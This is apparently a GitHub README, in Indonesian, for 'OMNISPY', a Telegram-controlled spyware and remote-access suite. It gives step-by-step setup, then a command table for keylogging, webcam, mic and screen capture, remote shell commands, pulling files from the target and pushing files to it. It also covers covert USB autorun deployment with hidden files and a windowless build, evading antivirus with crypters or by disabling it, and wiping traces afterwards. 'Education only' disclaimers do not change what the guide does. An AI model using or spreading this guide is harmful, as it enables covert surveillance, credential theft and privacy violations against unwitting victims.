# 🕵️ OMNISPY – Ultimate Spyware Suite

<div align="center">
<img width="1958" height="803" alt="1000296677" src="https://github.com/user-attachments/assets/ca12931e-cc9c-4e99-9cc7-87607aa95820" />


**OMNISPY** adalah spyware all-in-one yang bisa dikontrol lewat **Telegram** dan **dashboard web**.  
Dilengkapi dengan **20 fitur canggih**, dibuat untuk **edukasi dan pengujian keamanan**.

[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat&logo=python&logoColor=white)](https://www.python.org)
[![License MIT](https://img.shields.io/badge/License-MIT-green?style=flat)](LICENSE)
[![Status Active](https://img.shields.io/badge/Status-Active-success?style=flat)](https://github.com/hidayat-tanjung/OMNISPY)

</div>

---

## 📌 DAFTAR ISI

1. [Apa Itu OMNISPY?](#apa-itu-omnispy)
2. [Fitur Lengkap (20 Fitur)](#fitur-lengkap-20-fitur)
3. [Persiapan Awal](#persiapan-awal)
4. [Instalasi di Windows](#instalasi-di-windows)
5. [Instalasi di Linux](#instalasi-di-linux)
6. [Instalasi di PROOT Linux (Termux/Android)](#instalasi-di-proot-linux-termuxandroid--rekomendasi)
7. [Cara Konfigurasi](#cara-konfigurasi)
8. [Menjalankan OMNISPY](#menjalankan-omnispy)
9. [Cara Akses Telegram](#cara-akses-telegram)
10. [Cara Akses Web Dashboard](#cara-akses-web-dashboard)
11. [Daftar Perintah Telegram](#daftar-perintah-telegram)
12. [USB Rubber Ducky Setup](#cara-setting-di-flashdisk-usb-rubber-ducky)
13. [Menghentikan OMNISPY](#cara-menghentikan-omnispy)
14. [Troubleshooting](#troubleshooting)
15. [Catatan Penggunaan](#catatan-penggunaan-omnispy)
16. [Pesan dari Developer](#pesan-dari-イズミー)

---

## 🧠 APA ITU OMNISPY?

**OMNISPY** adalah gabungan dari **TELEGHOST** (spyware Telegram) dan **TITANVIEW** (dashboard web).

### Apa yang Bisa Lo Lakukan:

- 🎥 **Pantau target** dari Telegram atau browser
- 📱 **Dapatkan notifikasi real-time** saat terjadi aktivitas mencurigakan
- 📁 **Kelola file, rekam layar, deteksi gerakan**, dan banyak lagi
- 🔐 **Kontrol penuh** dari mana saja dengan Telegram atau Web Dashboard

**OMNISPY dirancang untuk edukasi dan pengujian keamanan di lingkungan terkontrol.**

---

## 🔧 FITUR LENGKAP (20 FITUR)

### 10 Fitur Utama (Dari TELEGHOST + TITANVIEW)

| No | Fitur | Fungsi |
|----|-------|--------|
| 1 | **Notifikasi Push HP** | Kirim alert otomatis ke Telegram saat ada aktivitas mencurigakan |
| 2 | **Remote Screen Share** | Live streaming layar target (2 fps) via Telegram & Web |
| 3 | **File Explorer** | Jelajahi dan kelola file target via Telegram & Web |
| 4 | **Geofencing** | Alert jika target keluar dari area tertentu |
| 5 | **Screenshot Schedule** | Ambil screenshot otomatis tiap 30 menit |
| 6 | **Keylogger with Timestamp** | Rekam ketikan dengan waktu kejadian |
| 7 | **Webcam on Motion** | Rekam foto/video saat ada gerakan di kamera |
| 8 | **Auto-Sync Cloud** | Backup hasil spyware ke cloud (simulasi) |
| 9 | **Multi-Target Support** | Pantau banyak perangkat dengan ID unik |
| 10 | **2FA/Password Protection** | Dashboard dilindungi password |

### 10 Fitur Tambahan (Eksklusif OMNISPY)

| No | Fitur | Fungsi |
|----|-------|--------|
| 11 | **Clipboard Monitoring** | Pantau isi clipboard target |
| 12 | **Mic Alert (Suara Keras)** | Kirim notifikasi jika mic menangkap suara keras |
| 13 | **WiFi Scanner** | Scan dan tampilkan daftar jaringan WiFi |
| 14 | **Battery Monitor** | Cek level baterai target (Windows) |
| 15 | **App Usage Tracker** | Lacak aplikasi yang sedang berjalan |
| 16 | **Remote Shutdown** | Matikan sistem target dari jarak jauh |
| 17 | **Website Blocker** | Blokir website tertentu |
| 18 | **Fake Alert** | Kirim notifikasi palsu (testing) |
| 19 | **SMS Sender (Simulasi)** | Kirim SMS dari target (simulasi) |
| 20 | **Call Logger (Simulasi)** | Ambil log panggilan target (simulasi) |

---

## 🔧 PERSIAPAN AWAL

### Langkah 1: Buat Bot Telegram

1. Buka aplikasi **Telegram**
2. Cari **@BotFather**
3. Kirim perintah `/newbot`
4. Ikuti instruksi dan beri nama bot
5. **Simpan TOKEN yang diberikan**

📋 **Contoh TOKEN:** `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

### Langkah 2: Dapatkan CHAT_ID

1. Kirim pesan apa pun ke bot yang baru lo buat
2. Buka URL di browser (ganti `<TOKEN>` dengan token lo):
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
3. Cari bagian `"chat":{"id":` dan catat angkanya

📋 **Contoh CHAT_ID:** `123456789`

---

## 🖥️ INSTALASI DI WINDOWS

### Langkah 1: Install Python

1. Download Python dari [python.org](https://python.org)
2. **PENTING:** Saat proses install, **centang** opsi `"Add Python to PATH"`
3. Klik "Install Now"
4. Tunggu hingga selesai

### Langkah 2: Download OMNISPY

```cmd
git clone https://github.com/hidayat-tanjung/OMNISPY.git
cd OMNISPY
```

### Langkah 3: Install Dependensi

```cmd
pip install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests schedule flask flask-socketio pyperclip
```

> **Catatan:** Jika ada error, coba install satu-satu atau gunakan `pip install --upgrade pip` dulu.

### Langkah 4: Jalankan

```cmd
python omnispy.py
```

✅ **OMNISPY akan mulai berjalan dan siap menerima perintah Telegram!**

---

## 🐧 INSTALASI DI LINUX

### Langkah 1: Update System & Install Dependencies

```bash
sudo apt update
sudo apt install python3 python3-pip git portaudio19-dev -y
```

### Langkah 2: Download OMNISPY

```bash
git clone https://github.com/hidayat-tanjung/OMNISPY.git
cd OMNISPY
```

### Langkah 3: Install Python Dependencies

```bash
pip3 install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests schedule flask flask-socketio pyperclip
```

### Langkah 4: Jalankan

```bash
python3 omnispy.py
```

✅ **OMNISPY siap berjalan di Linux!**

#### 🚀 Jalankan di Background (Opsional)

Agar OMNISPY tetap berjalan meskipun terminal ditutup:

```bash
nohup python3 omnispy.py > /dev/null 2>&1 &
```

---

## 📱 INSTALASI DI PROOT LINUX (TERMUX/ANDROID) – REKOMENDASI

### ⚠️ Kenapa PROOT?

Di Termux banyak library (opencv, pyaudio, pillow) yang error. **PROOT** memberikan lo Linux asli di Android, jadi semua library bekerja mulus.

### Langkah 1: Install PROOT di Termux

```bash
pkg update && pkg upgrade -y
pkg install proot-distro -y
```

### Langkah 2: Install Distro (Debian)

```bash
proot-distro install debian
```

> **Catatan:** Proses ini memakan waktu 5-10 menit tergantung koneksi internet.

### Langkah 3: Login ke Debian

```bash
proot-distro login debian
```

Sekarang lo berada di environment Debian di Android!

### Langkah 4: Update & Install Python

```bash
apt update && apt upgrade -y
apt install python3 python3-pip git nano -y
```

### Langkah 5: Install Dependensi OMNISPY

```bash
pip3 install telebot pyautogui opencv-python pillow numpy pynput pyaudio psutil requests schedule flask flask-socketio pyperclip
```

### Langkah 6: Download OMNISPY

```bash
git clone https://github.com/hidayat-tanjung/OMNISPY.git
cd OMNISPY
```

### Langkah 7: Konfigurasi & Jalankan

```bash
nano omnispy.py
```

Edit file dan ganti `BOT_TOKEN` dan `CHAT_ID` dengan milik lo (lihat [Persiapan Awal](#persiapan-awal)).

Tekan `Ctrl+X` → `Y` → `Enter` untuk simpan.

### Langkah 8: Jalankan OMNISPY

```bash
python3 omnispy.py
```

✅ **OMNISPY berjalan di Android!**

---

## ⚙️ CARA KONFIGURASI

### Edit File omnispy.py

Buka file `omnispy.py` dengan text editor favorit lo:

```bash
# Di Windows
notepad omnispy.py

# Di Linux/PROOT
nano omnispy.py
```

### Cari dan Ganti Konfigurasi Ini:

```python
# ===== KONFIGURASI =====
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI DENGAN TOKEN LO
CHAT_ID = "123456789"  # GANTI DENGAN CHAT_ID LO
DASHBOARD_PASSWORD = "admin123"  # GANTI DENGAN PASSWORD KUAT
```

### Simpan File

- **Windows:** Ctrl+S (Notepad)
- **Linux/PROOT:** Ctrl+X → Y → Enter (Nano)

✅ **Konfigurasi selesai!**

---

## 🚀 MENJALANKAN OMNISPY

### Di Windows

```cmd
python omnispy.py
```

### Di Linux

```bash
python3 omnispy.py
```

### Di PROOT (Debian/Android)

```bash
python3 omnispy.py
```

### Jalankan di Background (Linux/PROOT)

```bash
nohup python3 omnispy.py > omnispy.log 2>&1 &
```

Cek log:
```bash
tail -f omnispy.log
```

---

## 🤖 CARA AKSES TELEGRAM

### Setup Awal

1. **Buka aplikasi Telegram** di HP atau PC
2. **Cari bot yang sudah lo buat** (gunakan nama bot dari BotFather)
3. Klik `/start` atau kirim perintah pertama

### Mengirim Perintah

Kirim perintah seperti ini:

```
/screenshot
/keylog_start
/gps
/status
```

### Menerima Hasil

Semua hasil (screenshot, video, log, dll.) akan langsung masuk ke chat Telegram lo.

✅ **Real-time monitoring dari Telegram!**

---

## 🌐 CARA AKSES WEB DASHBOARD

### Setup Awal

1. **Jalankan OMNISPY** di target (lihat [Menjalankan OMNISPY](#menjalankan-omnispy))
2. **Buka browser** di HP atau PC yang terhubung ke jaringan yang sama

### Akses Dashboard

#### Lokal (di PC yang sama):
```
http://localhost:5000
```

#### Dari Perangkat Lain (di jaringan yang sama):
```
http://[IP_TARGET]:5000
```

Contoh: `http://192.168.1.100:5000`

### Login

- **Username:** (biarkan kosong atau default)
- **Password:** `admin123` (atau password yang lo ganti di konfigurasi)

### Lihat Dashboard

- 📊 Real-time monitoring
- 📁 File explorer
- 📸 Screenshot terbaru
- 🎥 Video recording
- ⌨️ Keylog data
- 📍 Lokasi GPS

---

## 🌍 Akses Dashboard dari Internet (Ngrok)

### Langkah 1: Install Ngrok

Download dari [ngrok.com](https://ngrok.com/download)

### Langkah 2: Jalankan Ngrok

```bash
ngrok http 5000
```

### Langkah 3: Copy Link

Ngrok akan menampilkan link seperti:
```
https://xxxx.ngrok-free.app
```

### Langkah 4: Akses dari Mana Saja

Buka link tersebut di browser (dari mana saja di dunia):
```
https://xxxx.ngrok-free.app
```

✅ **Dashboard bisa diakses dari internet!**

---

## 📋 DAFTAR PERINTAH TELEGRAM

| Perintah | Fungsi | Contoh |
|----------|--------|--------|
| `/screenshot` | Ambil layar target | `/screenshot` |
| `/screenrec [detik]` | Rekam layar (default 10s) | `/screenrec 30` |
| `/keylog_start` | Mulai keylogger | `/keylog_start` |
| `/keylog_stop` | Hentikan & kirim hasil | `/keylog_stop` |
| `/mic [detik]` | Rekam mic (default 10s) | `/mic 20` |
| `/cam_photo` | Foto dari kamera | `/cam_photo` |
| `/cam_video [detik]` | Video dari kamera | `/cam_video 15` |
| `/gps` | Kirim lokasi | `/gps` |
| `/cmd [perintah]` | Jalankan perintah sistem | `/cmd dir` atau `/cmd ls -la` |
| `/upload [path]` | Upload file dari target | `/upload C:\Users\admin\secret.txt` |
| `/download [url] [path]` | Download file ke target | `/download https://example.com/file.exe C:\temp\` |
| `/status` | Cek status OMNISPY | `/status` |
| `/listdir [path]` | List file di direktori | `/listdir C:\Users` |
| `/delete [path]` | Hapus file | `/delete C:\temp\file.txt` |
| `/stream_start` | Mulai screen streaming | `/stream_start` |
| `/stream_stop` | Hentikan streaming | `/stream_stop` |
| `/wifi` | Scan WiFi terdekat | `/wifi` |
| `/battery` | Cek level baterai | `/battery` |
| `/shutdown` | Matikan sistem | `/shutdown` |
| `/block [url]` | Blokir website | `/block facebook.com` |
| `/sms [nomor] [pesan]` | Kirim SMS (simulasi) | `/sms 081234567890 "Halo!"` |
| `/calllog` | Ambil call log (simulasi) | `/calllog` |

---

## 📁 CARA SETTING DI FLASHDISK (USB RUBBER DUCKY)

### Langkah 1: Compile Python ke .exe

Jalankan di CMD (Windows):

```cmd
pip install pyinstaller
pyinstaller --onefile --noconsole omnispy.py
```

File `.exe` akan berada di folder `dist/`:

```
dist/
└── omnispy.exe
```

### Langkah 2: Siapkan Struktur Flashdisk

Flashdisk lo harus terlihat seperti ini:

```
E:\ (Flashdisk)
├── omnispy.exe
├── templates/
│   ├── index.html
│   └── login.html
├── run.bat
└── autorun.inf (opsional)
```

### Langkah 3: Buat run.bat

Buat file baru bernama `run.bat` di flashdisk dengan konten:

```batch
@echo off
start /B omnispy.exe
exit
```

### Langkah 4: Buat autorun.inf (Opsional)

Buat file baru bernama `autorun.inf` di flashdisk dengan konten:

```ini
[AutoRun]
open=run.bat
icon=omnispy.exe
label=OMNISPY
```

### Langkah 5: Hidden Mode (Opsional)

1. Klik kanan file → **Properties**
2. **Centang** "Hidden"
3. Klik "Apply"

### Langkah 6: Jalankan

Colok flashdisk ke PC target, file `run.bat` akan otomatis berjalan (atau klik manual).

✅ **OMNISPY berjalan dari flashdisk!**

---

## 🛑 CARA MENGHENTIKAN OMNISPY

### Di Windows

```cmd
taskkill /F /IM python.exe
```

Atau langsung tutup CMD window.

### Di Linux / PROOT

```bash
pkill -f omnispy.py
```

Atau jika ingin hanya stop Flask server:

```bash
pkill -f flask
```

### Dari Flashdisk

Cukup **cabut flashdisk** dari PC, OMNISPY akan otomatis mati.

---

## ❓ TROUBLESHOOTING

### Q: OMNISPY gak kirim data ke Telegram?

**A:** 
- ✅ Cek `BOT_TOKEN` dan `CHAT_ID` di `omnispy.py`
- ✅ Pastikan bot Telegram sudah di-start (kirim `/start`)
- ✅ Pastikan **koneksi internet target aktif**
- ✅ Cek token dengan buka: `https://api.telegram.org/bot<TOKEN>/getMe`

---

### Q: Keylogger gak nangkap huruf?

**A:**
- ✅ Pastikan **pynput terinstall**: `pip install pynput`
- ✅ Di Windows, pastikan OMNISPY punya akses ke keyboard
- ✅ Di Android, keylogger hanya berfungsi di Termux/PROOT, bukan di app biasa

---

### Q: Rekam layar gagal di Android?

**A:**
- ✅ Butuh izin "Screen Recording"
- ✅ Klik "Allow" saat diminta izin
- ✅ Gunakan PROOT (lebih stabil daripada Termux murni)

---

### Q: Error `pyaudio di Linux?`

**A:**
```bash
sudo apt install portaudio19-dev -y
pip3 install pyaudio --force-reinstall
```

---

### Q: `ModuleNotFoundError: No module named 'PIL'`?

**A:**
```bash
pip install Pillow --upgrade
```

---

### Q: Flask gak jalan di PROOT?

**A:**
- ✅ Pastikan **port 5000 tidak dipakai**:
  ```bash
  pkill -f flask
  ```
- ✅ Atau ganti port di konfigurasi: `app.run(port=5001)`

---

### Q: Bisa dipakai di iPhone?

**A:** Tidak. OMNISPY hanya compatible dengan:
- ✅ Windows
- ✅ Linux
- ✅ Android (Termux/PROOT)

---

### Q: Antivirus mendeteksi OMNISPY?

**A:**
- ⚠️ Normal, karena ini tool surveillance
- ✅ Gunakan crypter/obfuscation: PyArmor, UPX
- ✅ Atau disable antivirus sementara (tapi perhatian: RESIKO!)

---

## 📌 CATATAN PENGGUNAAN OMNISPY

### ⚠️ 1. HANYA UNTUK EDUKASI & PENGUJIAN

- OMNISPY **bukan alat untuk merusak** atau mengintip tanpa izin
- Gunakan **hanya di perangkat sendiri** atau dengan **izin tertulis** dari pemilik perangkat
- **Penyalahgunaan adalah tanggung jawab pengguna sepenuhnya**

### 🔐 2. KEAMANAN DATA

| Item | Catatan |
|------|---------|
| **Telegram Bot** | Simpan TOKEN dengan aman, jangan share ke orang lain |
| **CHAT_ID** | Hanya lo yang perlu tahu |
| **Password Dashboard** | Ganti dari `admin123` ke password yang kuat |
| **Data Target** | Semua data terenkripsi saat dikirim ke cloud (simulasi) |

---

### 🖥️ 3. KOMPATIBILITAS PLATFORM

| Platform | Status | Catatan |
|----------|--------|---------|
| **Windows** | ✅ Full Support | Perlu Python 3.8+ |
| **Linux** | ✅ Full Support | Ubuntu, CentOS, Debian, Arch |
| **Termux (Android)** | ⚠️ Limited | Banyak library error |
| **PROOT (Android)** | ✅ Recommended | Jalan mulus seperti Linux asli |
| **macOS** | ✅ Full Support | Perlu Python 3.8+ |
| **iPhone** | ❌ Not Supported | iOS tidak memungkinkan |

---

### 📁 4. USB FLASHDISK (RUBBER DUCKY)

- ✅ File `omnispy.exe` dan folder `templates/` harus ada di flashdisk
- ✅ Jalankan `run.bat` sebagai **Administrator** (di Windows)
- ⚠️ Antivirus mungkin mendeteksi → matikan sementara (perhatian risiko!)

---

### 🤖 5. TELEGRAM BOT

| Item | Catatan |
|------|---------|
| **Bot Token** | Harus valid dan dari BotFather |
| **Bot Status** | Harus aktif dan terhubung internet |
| **Chat ID** | Harus akurat sesuai user_id Telegram lo |
| **Jika Bot Mati** | OMNISPY gak bisa kirim data |

---

### 🌐 6. WEB DASHBOARD

| Item | Catatan |
|------|---------|
| **Default Password** | `admin123` — GANTI SEGERA! |
| **Port** | Default 5000, bisa di-ganti di kode |
| **Firewall** | Pastikan port 5000 tidak diblokir |
| **WebSocket** | Dashboard butuh koneksi WebSocket aktif |
| **HTTPS** | Gunakan Ngrok untuk akses internet aman |

---

### 🛑 7. MENGHENTIKAN OMNISPY

| OS | Perintah |
|----|----------|
| **Windows** | `taskkill /F /IM python.exe` |
| **Linux** | `pkill -f omnispy.py` |
| **PROOT** | `pkill -f omnispy.py` |
| **Flashdisk** | Cabut flashdisk → otomatis mati |

---

### ⚡ 8. FITUR YANG BUTUH IZIN KHUSUS

| Fitur | Izin yang Dibutuhkan | Platform |
|-------|---------------------|----------|
| **Screenshot** | Akses Layar | Windows, Linux, Android |
| **Keylogger** | Akses Keyboard | Semua platform |
| **Rekam Mic** | Akses Mikrofon | Semua platform |
| **Kamera** | Akses Webcam | Windows, Linux, Android |
| **GPS/Lokasi** | Akses Internet (IP Geolocation) | Semua platform |
| **File Upload** | Akses Penyimpanan | Semua platform |

---

### 🧹 9. BERSIHIN JEJAK

Setelah selesai testing:

- ✅ Hapus file `omnispy_logs.db` (database log)
- ✅ Hapus folder `templates/` jika tidak diperlukan
- ✅ Hapus file OMNISPY dari flashdisk
- ✅ Clear browser history dashboard
- ✅ Reset password Telegram bot (di BotFather)

---

### 📌 10. PERINGATAN HUKUM

> ⚖️ **OMNISPY adalah alat edukasi untuk testing keamanan di lingkungan terkontrol.**
>
> ❌ **Menggunakan OMNISPY tanpa izin untuk mengintip, mencuri data, atau merugikan orang lain adalah TINDAKAN ILEGAL** dan bisa dipidana menurut UU ITE (Indonesia) atau cyberlaw setempat.
>
> 👨‍⚖️ **Saya (イズミー) dan pengembang tidak bertanggung jawab atas penyalahgunaan alat ini.**
>
> **Gunakan dengan bijak. Kepercayaan adalah hal yang rapuh.**

---

## 🔥 KESIMPULAN CEPAT

| Hal | Catatan |
|-----|---------|
| **Gunakan Untuk** | Belajar, testing, penetration testing di lingkungan terkontrol |
| **JANGAN Dipakai Untuk** | Kejahatan, pengintaian, pencurian data |
| **Simpan Dengan Aman** | Token Telegram, Chat ID, Password Dashboard |
| **Hapus Setelah Selesai** | Log, database, file config |
| **Hukum** | Stay legal, respect privacy, use ethically |

---

## 📌 PESAN DARI イズミー

> "Ilmu ini untuk memahami celah keamanan, bukan untuk merusak.
>
> Gunakan dengan bijak, karena kepercayaan adalah hal yang rapuh.
>
> Ketika lo punya kekuatan, tanggung jawab lo juga besar.
>
> Stay safe. Stay stealthy. Stay ethical."

**イズミー Active – 2050 Style**  
🖥️👻🔥💀

---

<div align="center">


## 💖 Support & Donations

<p align="center">

<a href="https://paypal.me/YOUR_PAYPAL_USERNAME" target="_blank">
  <img src="https://img.shields.io/badge/PayPal-Donate-00457C?style=for-the-badge&logo=paypal&logoColor=white" alt="PayPal">
</a>

<a href="https://ko-fi.com/YOUR_USERNAME" target="_blank">
  <img src="https://img.shields.io/badge/Ko--fi-Support-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white" alt="Ko-fi">
</a>

<a href="https://buymeacoffee.com/YOUR_USERNAME" target="_blank">
  <img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=000000" alt="Buy Me a Coffee">
</a>

<a href="https://wise.com/pay/me/YOUR_WISE_USERNAME" target="_blank">
  <img src="https://img.shields.io/badge/Wise-Transfer-9FE870?style=for-the-badge&logo=wise&logoColor=000000" alt="Wise">
</a>

</p>
